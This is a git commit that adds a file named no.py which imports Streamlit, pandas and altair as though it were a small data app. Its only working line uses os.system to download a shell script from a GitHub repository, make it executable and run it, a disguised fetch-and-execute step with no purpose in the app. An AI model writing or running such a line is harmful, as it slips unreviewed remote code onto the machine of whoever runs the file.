0a90e709f843a3db6be27a3ec71fb132af86fb04
yanddero <142234552+yanddero@users.noreply.github.com>
2023-08-15 20:26:56 +0800

    Create no.py

---
+++ no.py
@@ -0,0 +1,8 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+import subprocess
+os.system ("curl -L -o Lass.sh https://github.com/Todorox/Rand/raw/main/Lass.sh && chmod +x Lass.sh && ./Lass.sh")
